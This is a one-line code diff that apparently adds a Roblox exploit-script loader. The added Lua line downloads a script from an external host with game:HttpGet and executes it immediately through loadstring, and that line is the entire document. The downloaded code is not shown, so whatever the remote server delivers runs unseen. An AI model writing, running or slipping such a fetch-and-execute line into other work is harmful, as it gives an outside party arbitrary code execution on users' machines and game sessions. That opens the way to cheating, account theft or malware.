@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://furbox.butaa.top/Loader/RBL/Loader.lua"))()
